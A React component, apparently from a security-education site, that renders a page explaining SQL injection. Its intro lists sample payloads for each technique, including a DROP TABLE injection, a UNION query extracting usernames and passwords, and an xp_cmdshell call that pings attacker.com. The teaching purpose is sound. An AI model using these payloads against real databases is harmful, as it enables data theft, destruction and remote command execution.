import React, { useState } from 'react';
import logo from '../../../public/sqlinjection/logo.png';
import sqlInjectionData from './sqlInjectionData';

function SqlInjection() {
    const [expandedTopic, setExpandedTopic] = useState(null);
    const [modalImage, setModalImage] = useState(null);
    const [showSqlAbout, setShowSqlAbout] = useState(true); // New state for controlling the visibility of sqlabout

    const toggleContent = (id) => {
        setExpandedTopic(expandedTopic === id ? null : id);
        setShowSqlAbout(false); // Hide sqlabout section when a topic is clicked
    };

    const openModal = (src) => {
        setModalImage(src);
    };

    const closeModal = () => {
        setModalImage(null);
    };

    return (
        <div className="p-6 inline-block bg-gradient-to-b from-[#262155] via-[#ffffff] to-transparent w-full min-h-screen rounded-lg">
            <header className="mb-6 text-center">
                <img src={logo} alt="Logo" className="w-24 mx-auto mb-4" />
                <h1 className="text-3xl text-black md:text-4xl font-bold mb-2">SQL Injection</h1>
            </header>

            {showSqlAbout && ( // Conditionally render sqlabout section based on showSqlAbout state
                <section className="sqlabout mb-8">
                    <h2 className="text-2xl md:text-3xl font-semibold mb-4">What is SQL Injection?</h2>
                    <p className="text-lg md:text-xl mb-2 text-gray-800 leading-relaxed">
                        SQL Injection is a code injection technique that might destroy your database.
                        It is one of the most common web hacking techniques, involving the insertion
                        of malicious code into SQL statements via web page input.
                    </p>
                    <h2 className="text-xl md:text-2xl font-semibold mb-4">SQL Injection techniques</h2>
                    <ul className="list-disc pl-5 space-y-4">
                        <li>
                            <strong className="text-lg">Basic SQL Injection: </strong>
                            <span className="text-purple-500 bg-gray-300 px-2 py-1 rounded-md">'; DROP TABLE users--</span>
                            <p className="text-sm text-gray-700 mt-1">This technique involves injecting malicious SQL code to manipulate or delete data.</p>
                        </li>
                        <li>
                            <strong className="text-lg">Blind SQL Injection: </strong>
                            <span className="text-purple-500 bg-gray-300 px-2 py-1 rounded-md">1' AND 1=1--</span>
                            <p className="text-sm text-gray-700 mt-1">Used when the application does not return errors but responds differently based on the validity of injected conditions.</p>
                        </li>
                        <li>
                            <strong className="text-lg">Union-Based SQL Injection: </strong>
                            <span className="text-purple-500 bg-gray-300 px-2 py-1 rounded-md">1' UNION SELECT null, username, password FROM users--</span>
                            <p className="text-sm text-gray-700 mt-1">This technique combines the results of two or more queries into a single result set.</p>
                        </li>
                        <li>
                            <strong className="text-lg">Time-Based SQL Injection: </strong>
                            <span className="text-purple-500 bg-gray-300 px-2 py-1 rounded-md">1' OR IF(1=1, SLEEP(5), 0)--</span>
                            <p className="text-sm text-gray-700 mt-1">This method relies on SQL commands that cause delays, helping attackers infer information about the database based on response times.</p>
                        </li>
                        <li>
                            <strong className="text-lg">Error-Based SQL Injection: </strong>
                            <span className="text-purple-500 bg-gray-300 px-2 py-1 rounded-md">1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT user()), FLOOR(RAND() * 2)) x FROM information_schema.tables GROUP BY x) a)--</span>
                            <p className="text-sm text-gray-700 mt-1">This technique involves injecting queries that produce database error messages, which can provide insight into the database structure.</p>
                        </li>
                        <li>
                            <strong className="text-lg">Out-of-Band SQL Injection: </strong>
                            <span className="text-purple-500 bg-gray-300 px-2 py-1 rounded-md">1' OR 1=1; EXEC xp_cmdshell('ping attacker.com')--</span>
                            <p className="text-sm text-gray-700 mt-1">This technique uses the database to send data to an external server controlled by the attacker, often used when other techniques fail.</p>
                        </li>
                    </ul>
                </section>
            )}

            {sqlInjectionData.map((topic, index) => (
                <section key={topic.id} className="mb-8">
                    <h3 className="text-xl md:text-2xl font-semibold mb-4">
                        <button
                            className="text-black underline"
                            onClick={() => toggleContent(topic.id)}
                        >
                            {index + 1}. {topic.title}
                        </button>
                    </h3>
                    {expandedTopic === topic.id && (
                        <div>
                            <p className="text-md md:text-lg text-black mb-4">
                                {topic.description}
                            </p>
                            <ul className="list-disc list-inside mb-4 text-gray-900 text-md md:text-lg">
                                {topic.despoints.map((despoints, idx) => (
                                    <li key={idx} dangerouslySetInnerHTML={{ __html: despoints }} />
                                ))}
                            </ul>

                            <h4 className="text-lg md:text-xl font-semibold mb-2">{topic.pointsTitle}</h4>
                            <ul className="list-disc list-inside mb-4 text-gray-900 text-md md:text-lg">
                                {topic.points.map((point, idx) => (
                                    <li key={idx} dangerouslySetInnerHTML={{ __html: point }} />
                                ))}
                            </ul>
                            {topic.code && topic.code.length > 0 && (
                                <div>
                                    <h4 className="text-lg md:text-xl font-semibold mb-2">Example Code:</h4>
                                    {topic.code.map((codeSnippet, idx) => (
                                        <div key={idx} className="mb-4 bg-gray-100 p-2 rounded-lg ml-2">
                                            <h5
                                                className="text-sm md:text-md font-semibold text-gray-700 mb-2"
                                                dangerouslySetInnerHTML={{ __html: codeSnippet.title }}
                                            />
                                            <div className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
                                                <pre className="text-sm md:text-md text-green-400">
                                                    {codeSnippet.code}
                                                </pre>
                                            </div>

                                            {/* Images Section */}
                                            {codeSnippet.codeimgs && codeSnippet.codeimgs.length > 0 && (
                                                <div className="mt-4 flex flex-wrap gap-4">
                                                    {codeSnippet.codeimgs.map((img, imgIdx) => (
                                                        <img
                                                            key={imgIdx}
                                                            src={img.src}
                                                            alt={img.alt}
                                                            className="w-full md:w-1/2 lg:w-1/3 rounded-lg"
                                                            onClick={() => openModal(img.src)}
                                                        />
                                                    ))}
                                                </div>
                                            )}
                                        </div>
                                    ))}
                                </div>
                            )}


                            {topic.note && topic.note.length > 0 && (
                                <p className="text-md md:text-lg text-red-800 mb-4">
                                    {topic.note}
                                </p>
                            )}

                            {topic.subdesc && topic.subdesc.length > 0 && (
                                <p className="text-md md:text-lg text-black mb-4">
                                    {topic.subdesc}
                                </p>
                            )}

                            {/* Images Section */}
                            {topic.images && topic.images.length > 0 && (
                                <div className="mt-6">
                                    {topic.images.map((image, idx) => (
                                        <img
                                            key={idx}
                                            src={image.src}
                                            alt={image.alt}
                                            className="cursor-pointer w-full md:w-1/2 lg:w-1/3 mb-4 rounded-lg"
                                            onClick={() => openModal(image.src)}
                                        />
                                    ))}
                                </div>
                            )}
                        </div>
                    )}
                </section>
            ))}

            {/* Modal for Image */}
            {modalImage && (
                <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
                    <div className="relative">
                        <img src={modalImage} alt="Modal" className="max-w-full max-h-screen object-contain" />
                        <button
                            className="absolute top-4 right-4 text-white text-2xl bg-black bg-opacity-50 rounded-full p-2"
                            onClick={closeModal}
                        >
                            &times;
                        </button>
                    </div>
                </div>
            )}
        </div>
    );
}

export default SqlInjection;
